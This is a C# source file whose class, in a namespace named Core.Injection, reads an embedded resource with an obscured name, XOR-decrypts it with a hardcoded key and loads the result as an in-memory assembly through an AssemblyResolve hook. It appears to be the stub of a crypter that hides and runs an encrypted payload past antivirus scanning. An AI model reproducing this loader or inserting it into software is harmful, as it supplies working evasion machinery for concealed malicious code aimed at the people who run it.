using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Core.Injection
{
    class Resource
    {
        private static byte[] array;

        public static void Reader()
        {

            byte[] passbytes = Encoding.ASCII.GetBytes(@"0xNull");


            using (Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream("=(0xFF)"))
            using (StreamReader reader = new StreamReader(stream))
            {

                array = new byte[stream.Length];
                stream.Read(array, 0, array.Length);
                for (int i = 0; i < array.Length; i++)
                {
                    array[i] = (byte)(passbytes[i % passbytes.Length] ^ array[i]);
                }

            }
            AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
        }
        public static Assembly ResolveAssembly(Object sender, ResolveEventArgs e)
        {

            return Assembly.Load(array);

        }
    }
}
